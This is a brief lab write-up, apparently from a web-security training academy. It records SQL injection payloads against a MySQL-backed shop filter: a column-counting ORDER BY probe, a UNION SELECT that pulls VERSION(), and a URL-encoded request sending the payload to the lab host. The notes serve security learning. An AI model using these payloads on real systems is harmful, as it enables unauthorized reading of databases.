# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

Target:  To solve the lab, display the database version string.

Analysis:

- no of columns 2 `Accessories'+order+by+2#`
- using this blog `https://stackoverflow.com/questions/4300669/what-does-mean-in-sql` we can figure that we facing MySQL Server
- `Accessories'+UNION+SELECT+NULL,VERSION()+#+`
- `https://0aea00c103e36cd183cba569007700b5.web-security-academy.net/filter?category=%41%63%63%65%73%73%6f%72%69%65%73%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%20%2c%20%56%45%52%53%49%4f%4e%28%29%20%20%23`
